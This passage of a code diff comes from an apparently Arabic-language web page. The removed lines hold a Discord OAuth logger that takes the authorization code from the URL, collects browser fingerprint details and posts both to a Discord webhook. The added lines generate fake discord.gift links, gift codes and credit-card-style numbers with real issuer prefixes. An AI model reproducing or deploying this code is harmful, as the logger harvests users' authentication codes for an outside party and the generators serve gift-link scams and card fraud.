+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let code = 'https://discord.gift/';
+            for (let i = 0; i < 16; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
             }
+            return code;
         }
         
-        // إرسال الرمز إلى webhook
-        function sendTokenToWebhook(token, type, description) {
-            const browserInfo = getBrowserInfo();
-            
-            const webhookData = {
-                username: "🎯 Token Generator Pro",
-                avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png",
-                embeds: [{
-                    title: "🔥 رمز جديد تم إنشاؤه",
-                    description: `تم إنشاء ${description} بنجاح`,
-                    color: 5865242,
-                    fields: [
-                        {
-                            name: "🎫 الرمز المُنشأ",
-                            value: `\`\`\`${token}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🏷️ نوع الرمز",
-                            value: type.toUpperCase(),
-                            inline: true
-                        },
-                        {
-                            name: "📊 إجمالي الرموز المُنشأة",
-                            value: generatedTokens.toString(),
-                            inline: true
-                        },
-                        {
-                            name: "🌐 معلومات النظام",
-                            value: `**المتصفح:** ${browserInfo.browser}\n**النظام:** ${browserInfo.platform}\n**IP:** ${browserInfo.ip || 'غير متاح'}`,
-                            inline: false
-                        },
-                        {
-                            name: "⏰ الوقت",
-                            value: new Date().toLocaleString('ar-SA'),
-                            inline: true
-                        }
-                    ],
-                    thumbnail: {
-                        url: "https://cdn.discordapp.com/embed/avatars/2.png"
-                    },
-                    footer: {
-                        text: "Discord Token Generator System",
-                        icon_url: "https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png"
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            
-            fetch(NEW_WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(webhookData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('✅ تم إرسال الرمز بنجاح');
-                    sentTokens++;
-                    document.getElementById('sentCount').textContent = sentTokens;
-                    showWebhookStatus(true);
-                } else {
-                    console.error('❌ فشل في إرسال الرمز:', response.status);
-                    showWebhookStatus(false);
-                }
-            })
-            .catch(error => {
-                console.error('❌ خطأ في إرسال الرمز:', error);
-                showWebhookStatus(false);
-            });
+        // إنشاء رمز هدية
+        function generateGiftCode() {
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let code = 'GIFT-';
+            for (let i = 0; i < 12; i++) {
+                if (i > 0 && i % 4 === 0) code += '-';
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
         }
         
-        // الحصول على معلومات المتصفح
-        function getBrowserInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                browser: navigator.userAgent.split(' ').pop(),
-                cookieEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: window.location.href,
-                referrer: document.referrer || 'مباشر'
-            };
-        }
-        
-        // فحص الكود المرتجع من Discord
-        function checkAuthCode() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get('code');
-            const error = urlParams.get('error');
+        // إنشاء بطاقة ائتمان
+        function generateCreditCard(type) {
+            const names = ['Ahmed Ali', 'Sara Mohammed', 'Omar Hassan', 'Fatima Ahmad', 'Khalid Ibrahim'];
+            const currentYear = new Date().getFullYear();
             
-            if (error) {
-                alert('خطأ في المصادقة: ' + error);
-                return;
+            let prefix = '';
+            let length = 16;
+            let typeName = '';
+            
+            switch(type) {
+                case 'visa':
+                    prefix = '4';
+                    typeName = 'Visa';
+                    break;
+                case 'mastercard':
+                    prefix = '5' + Math.floor(Math.random() * 5 + 1);
+                    typeName = 'MasterCard';
+                    break;
+                case 'amex':
+                    prefix = '3' + (Math.random() < 0.5 ? '4' : '7');
+                    length = 15;
+                    typeName = 'American Express';
+                    break;
+                case 'paypal':
+                    prefix = '4';
+                    typeName = 'PayPal Card';
+                    break;
             }
             
-            if (code) {
-                document.getElementById('authCode').textContent = code;
-                document.getElementById('authCode').style.display = 'block';
-                
-                simulateUserData(code);
-                
-                const newUrl = window.location.origin + window.location.pathname;
-                window.history.replaceState({}, document.title, newUrl);
-            }
-        }
-        
-        // محاكاة بيانات المستخدم
-        function simulateUserData(code) {
-            document.getElementById('loading').style.display = 'block';
-            
-            setTimeout(() => {
-                const userData = {
-                    id: Math.random().toString().substr(2, 18),
-                    username: 'DiscordUser',
-                    discriminator: Math.floor(Math.random() * 9999).toString().padStart(4, '0'),
-                    email: 'user@example.com',
-                    avatar: null,
-                    code: code
-                };
-                
-                showUserInfo(userData);
-                document.getElementById('loading').style.display = 'none';
-            }, 2000);
-        }
-        
-        // عرض معلومات المستخدم
-        function showUserInfo(user) {
-            document.getElementById('loginSection').style.display = 'none';
-            
-            document.getElementById('userName').textContent = user.username + '#' + user.discriminator;
-            document.getElementById('userEmail').textContent = user.email;
-            
-            const defaultAvatar = `https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png`;
-            const userAvatar = user.avatar ? 
-                `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 
-                defaultAvatar;
-            
-            document.getElementById('userAvatar').src = userAvatar;
-            document.getElementById('userInfo').style.display = 'block';
-            
-            const userData = {
-                ...user,
-                timestamp: new Date().toISOString()
-            };
-            
-            console.log('User Data:', userData);
-            
-            // إرسال بيانات المستخدم إلى webhook
-            sendUserDataToWebhook(userData);
-        }
-        
-        // إرسال بيانات المستخدم إلى webhook
-        function sendUserDataToWebhook(userData) {
-            const browserInfo = getBrowserInfo();
-            
-            const webhookData = {
-                username: "🔐 Discord OAuth Logger Pro",
-                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
-                embeds: [{
-                    title: "🎉 تسجيل دخول جديد عبر Discord",
-                    description: "تم تسجيل دخول مستخدم جديد بنجاح في النظام",
-                    color: 5865242,
-                    fields: [
-                        {
-                            name: "👤 معلومات المستخدم",
-                            value: `**الاسم:** ${userData.username}#${userData.discriminator}\n**المعرف:** ${userData.id}\n**البريد:** ${userData.email || 'غير متوفر'}`,
-                            inline: false
-                        },
-                        {
-                            name: "🔑 كود المصادقة",
-                            value: `\`\`\`${userData.code}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🌐 معلومات الجلسة",
-                            value: `**المتصفح:** ${browserInfo.browser}\n**النظام:** ${browserInfo.platform}\n**اللغة:** ${browserInfo.language}`,
-                            inline: true
-                        },
-                        {
-                            name: "📱 معلومات الشاشة",
-                            value: `**الدقة:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n**المنطقة الزمنية:** ${browserInfo.timezone}`,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 معلومات الوصول",
-                            value: `**الرابط:** ${browserInfo.url}\n**المصدر:** ${browserInfo.referrer}`,
-                            inline: false
+            let number = prefix;
